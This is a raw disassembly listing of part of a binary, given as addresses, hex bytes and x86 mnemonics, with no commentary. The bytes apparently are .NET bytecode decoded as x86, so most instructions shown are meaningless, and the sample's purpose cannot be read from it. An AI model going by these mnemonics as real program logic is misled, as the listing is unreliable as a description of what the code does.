  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 1c       	add    $0x1c720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 24 21       	and    $0x21247216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 8e    	or     -0x718de7db(%edx),%ah
  4031e4:	21 00                	and    %eax,(%eax)
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 a0    	or     -0x5f8de5db(%edx),%ah
  4031f5:	21 00                	and    %eax,(%eax)
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 b4             	or     -0x4c(%edx),%dh
  403227:	21 00                	and    %eax,(%eax)
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 12             	or     0x12(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 12             	or     0x12(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 16                	jb     0x4032d9
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 20             	or     %esi,0x20(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 34                	jb     0x40331a
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 54                	jb     0x403346
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 12             	or     0x12(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 6a                	jb     0x403378
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 72                	jb     0x403396
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 7e                	jb     0x4033ae
  403330:	22 00                	and    (%eax),%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 8e                	jb     0x4033fb
  40346d:	22 00                	and    (%eax),%al
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 94             	adc    %esi,-0x6c(%edx)
  4034ae:	22 00                	and    (%eax),%al
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 da 22    	or     0x22da7209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	f4                   	hlt
  4034ec:	22 00                	and    (%eax),%al
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 20             	or     %esi,0x20(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 2c             	or     0x2c(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	3c 23                	cmp    $0x23,%al
  403522:	00 70 6f             	add    %dh,0x6f(%eax)
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 20                	jb     0x403551
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 4a             	or     0x4a(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 60             	adc    %esi,0x60(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
